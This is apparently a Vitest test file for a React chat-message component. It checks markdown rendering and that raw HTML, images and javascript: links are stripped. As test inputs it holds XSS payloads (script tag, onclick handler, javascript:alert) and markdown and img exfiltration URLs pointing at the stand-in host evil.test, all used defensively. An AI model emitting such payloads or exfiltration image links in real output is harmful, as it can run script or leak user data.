import { act } from 'react';
import { createRoot } from 'react-dom/client';
import { afterEach, describe, expect, it } from 'vitest';
import { MessageBubble } from './MessageBubble';

(globalThis as { IS_REACT_ACT_ENVIRONMENT?: boolean }).IS_REACT_ACT_ENVIRONMENT = true;

afterEach(() => {
  document.body.innerHTML = '';
});

async function render(role: 'user' | 'assistant', text: string): Promise<HTMLElement> {
  const container = document.createElement('div');
  document.body.append(container);
  const root = createRoot(container);
  await act(async () => root.render(<MessageBubble role={role} text={text} />));
  return container;
}

describe('<MessageBubble /> assistant markdown', () => {
  it('renders bold, lists, headings and rules as elements', async () => {
    const container = await render(
      'assistant',
      '### Resultados\n\n**Zapatilla Aurora** cuesta poco.\n\n- talla 40\n- talla 41\n\n1. primero\n2. segundo\n\n---\n\nFin con `codigo`.',
    );
    expect(container.querySelector('h3')?.textContent).toBe('Resultados');
    expect(container.querySelector('strong')?.textContent).toBe('Zapatilla Aurora');
    expect(container.querySelectorAll('ul > li')).toHaveLength(2);
    expect(container.querySelectorAll('ol > li')).toHaveLength(2);
    expect(container.querySelector('hr')).not.toBeNull();
    expect(container.querySelector('code')?.textContent).toBe('codigo');
    expect(container.textContent).not.toContain('**');
  });

  it('does not render raw HTML', async () => {
    const container = await render('assistant', 'hola <script>window.pwned = 1</script> <b onclick="x()">b</b>\n\n<div id="injected">x</div>');
    expect(container.querySelector('script')).toBeNull();
    expect(container.querySelector('b')).toBeNull();
    expect(container.querySelector('#injected')).toBeNull();
    expect(container.querySelector('[onclick]')).toBeNull();
  });

  it('never renders images, so a markdown image cannot auto-load an exfiltration URL', async () => {
    const container = await render('assistant', 'mira ![x](https://evil.test/?d=1) y <img src="https://evil.test/?d=2">');
    expect(container.querySelector('img')).toBeNull();
    expect(container.innerHTML).not.toContain('evil.test');
  });

  it('drops javascript: hrefs and opens safe links in a new tab', async () => {
    const container = await render('assistant', '[a](javascript:alert(1)) y [b](https://example.com/p)');
    const links = [...container.querySelectorAll('a')];
    for (const link of links) expect(link.getAttribute('href') ?? '').not.toMatch(/^\s*javascript:/i);
    const safe = links.find((link) => link.textContent === 'b');
    expect(safe?.getAttribute('href')).toBe('https://example.com/p');
    expect(safe?.getAttribute('target')).toBe('_blank');
    expect(safe?.getAttribute('rel')).toBe('noopener noreferrer');
  });
});

describe('<MessageBubble /> user text', () => {
  it('keeps user text literal', async () => {
    const text = '**hola** <b>x</b> ![x](https://evil.test/?d=1)';
    const container = await render('user', text);
    const bubble = container.querySelector('.msg--user');
    expect(bubble?.textContent).toBe(text);
    expect(bubble?.children).toHaveLength(0);
  });
});
